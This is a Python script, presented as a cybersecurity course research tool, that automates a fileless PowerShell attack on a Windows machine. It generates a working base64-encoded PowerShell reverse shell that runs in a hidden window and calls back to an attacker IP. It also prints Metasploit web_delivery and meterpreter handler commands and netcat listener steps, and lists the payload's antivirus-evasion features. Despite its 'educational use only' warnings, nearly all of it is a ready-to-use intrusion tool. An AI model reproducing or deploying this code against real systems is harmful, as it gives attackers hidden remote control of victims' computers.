#!/usr/bin/env python3
"""
Fileless PowerShell Attack Automation Tool
Author: Hunter
Course: Cybersecurity Research
Purpose: Automate fileless malware attacks for research purposes

WARNING: For educational and authorized testing only!
"""

import base64
import socket
import subprocess
import argparse
import datetime
import json
from typing import Dict, Optional

class FilelessAttackFramework:
    """Framework for automating fileless PowerShell attacks"""
    
    def __init__(self, attacker_ip: str, target_ip: str, port: int = 4444):
        self.attacker_ip = attacker_ip
        self.target_ip = target_ip
        self.port = port
        self.timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        self.attack_log = []
        
    def generate_reverse_shell_payload(self) -> str:
        """Generate PowerShell reverse shell payload"""
        
        # PowerShell reverse shell code
        ps_code = f"""
$client = New-Object System.Net.Sockets.TCPClient('{self.attacker_ip}',{self.port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
"""
        
        # Encode payload in base64
        ps_bytes = ps_code.encode('utf-16le')
        ps_b64 = base64.b64encode(ps_bytes).decode()
        
        # Create PowerShell command
        command = f"powershell.exe -nop -w hidden -enc {ps_b64}"
        
        self.log_event("Payload generated", {
            "payload_size": len(ps_b64),
            "encoding": "base64",
            "target": self.target_ip
        })
        
        return command
    
    def generate_metasploit_web_delivery_command(self) -> str:
        """Generate Metasploit web_delivery module command"""
        
        msfconsole_commands = f"""
use exploit/multi/script/web_delivery
set target 2
set payload windows/meterpreter/reverse_tcp
set LHOST {self.attacker_ip}
set SRVHOST {self.attacker_ip}
set SRVPORT 8080
set LPORT {self.port}
exploit -j
"""
        
        self.log_event("Metasploit commands generated", {
            "module": "web_delivery",
            "payload": "windows/meterpreter/reverse_tcp"
        })
        
        return msfconsole_commands
    
    def start_listener(self, listener_type: str = "netcat"):
        """Start a listener for incoming connections"""
        
        if listener_type == "netcat":
            print(f"[*] Starting Netcat listener on port {self.port}...")
            print(f"[*] Run this command in a separate terminal:")
            print(f"\n    nc -lvnp {self.port}\n")
            
        elif listener_type == "metasploit":
            print(f"[*] Starting Metasploit listener...")
            print(f"[*] Run these commands in msfconsole:")
            print(f"""
    use exploit/multi/handler
    set payload windows/meterpreter/reverse_tcp
    set LHOST {self.attacker_ip}
    set LPORT {self.port}
    set ExitOnSession false
    exploit -j
""")
        
        self.log_event(f"Listener instructions provided", {
            "type": listener_type,
            "port": self.port
        })
    
    def log_event(self, event: str, details: Dict):
        """Log attack events for documentation"""
        log_entry = {
            "timestamp": datetime.datetime.now().isoformat(),
            "event": event,
            "details": details
        }
        self.attack_log.append(log_entry)
    
    def save_attack_log(self, filename: Optional[str] = None):
        """Save attack log to file"""
        if filename is None:
            filename = f"attack_log_{self.timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(self.attack_log, f, indent=2)
        
        print(f"[+] Attack log saved to: {filename}")
    
    def generate_documentation(self) -> str:
        """Generate attack documentation for research paper"""
        
        doc = []
        doc.append("=" * 80)
        doc.append("FILELESS MALWARE ATTACK DOCUMENTATION")
        doc.append("=" * 80)
        doc.append(f"Timestamp: {self.timestamp}")
        doc.append(f"Attacker IP: {self.attacker_ip}")
        doc.append(f"Target IP: {self.target_ip}")
        doc.append(f"Listening Port: {self.port}")
        doc.append("=" * 80)
        doc.append("")
        
        doc.append("ATTACK METHODOLOGY")
        doc.append("-" * 80)
        doc.append("1. Reconnaissance: Nmap scan to identify vulnerable services")
        doc.append("2. Payload Generation: Create PowerShell reverse shell")
        doc.append("3. Execution: Run payload on target system via PowerShell")
        doc.append("4. Connection: Establish reverse TCP connection")
        doc.append("5. Post-Exploitation: Execute commands in memory")
        doc.append("")
        
        doc.append("FILELESS CHARACTERISTICS")
        doc.append("-" * 80)
        doc.append("✓ No malicious files written to disk")
        doc.append("✓ Executes entirely in PowerShell memory")
        doc.append("✓ Uses legitimate Windows tools (PowerShell)")
        doc.append("✓ Bypasses traditional file-based antivirus")
        doc.append("✓ Minimal forensic footprint")
        doc.append("")
        
        doc.append("DEFENSE EVASION TECHNIQUES")
        doc.append("-" * 80)
        doc.append("• Living Off the Land: Uses built-in PowerShell")
        doc.append("• In-Memory Execution: No file I/O operations")
        doc.append("• Encoded Payload: Base64 encoding obfuscates intent")
        doc.append("• Hidden Window: -w hidden flag prevents visibility")
        doc.append("• No Execution Policy: -nop bypasses restrictions")
        doc.append("")
        
        return '\n'.join(doc)

def main():
    """Main execution function"""
    
    parser = argparse.ArgumentParser(
        description='Fileless Malware Attack Automation Framework',
        epilog='WARNING: For authorized educational research only!'
    )
    
    parser.add_argument('attacker_ip', help='Attacker IP address (Ubuntu)')
    parser.add_argument('target_ip', help='Target IP address (Windows)')
    parser.add_argument('-p', '--port', type=int, default=4444, 
                       help='Listening port (default: 4444)')
    parser.add_argument('-m', '--method', choices=['netcat', 'metasploit'], 
                       default='netcat', help='Attack method')
    parser.add_argument('-o', '--output', help='Output file for payload')
    
    args = parser.parse_args()
    
    print("""
╔═══════════════════════════════════════════════════════════╗
║   FILELESS MALWARE ATTACK AUTOMATION FRAMEWORK            ║
║   Research Project: Offensive Security Tools              ║
║   WARNING: Educational Use Only!                          ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    framework = FilelessAttackFramework(args.attacker_ip, args.target_ip, args.port)
    
    print(f"[*] Configuration:")
    print(f"    Attacker: {args.attacker_ip}")
    print(f"    Target: {args.target_ip}")
    print(f"    Port: {args.port}")
    print(f"    Method: {args.method}")
    print()
    
    # Start listener instructions
    framework.start_listener(args.method)
    
    # Generate payload
    print("[*] Generating PowerShell reverse shell payload...")
    payload = framework.generate_reverse_shell_payload()
    
    print("\n[+] Payload generated successfully!")
    print("\n" + "=" * 80)
    print("COPY AND PASTE THIS COMMAND ON THE WINDOWS TARGET:")
    print("=" * 80)
    print(payload)
    print("=" * 80)
    print()
    
    # Save payload to file if requested
    if args.output:
        with open(args.output, 'w') as f:
            f.write(payload)
        print(f"[+] Payload saved to: {args.output}")
    
    # Generate Metasploit commands if requested
    if args.method == 'metasploit':
        print("\n[*] Metasploit web_delivery alternative:")
        msf_commands = framework.generate_metasploit_web_delivery_command()
        print(msf_commands)
    
    # Generate documentation
    print("\n[*] Generating attack documentation...")
    doc = framework.generate_documentation()
    
    doc_filename = f"attack_documentation_{framework.timestamp}.txt"
    with open(doc_filename, 'w') as f:
        f.write(doc)
    print(f"[+] Documentation saved to: {doc_filename}")
    
    # Save attack log
    framework.save_attack_log()
    
    print("\n[*] NEXT STEPS:")
    print("    1. Start the listener (see command above)")
    print("    2. Execute the payload on the Windows target")
    print("    3. Wait for reverse connection")
    print("    4. Document the results for your research paper")
    print("\n[+] Framework ready! Good luck with your research!")

if __name__ == "__main__":
    main()
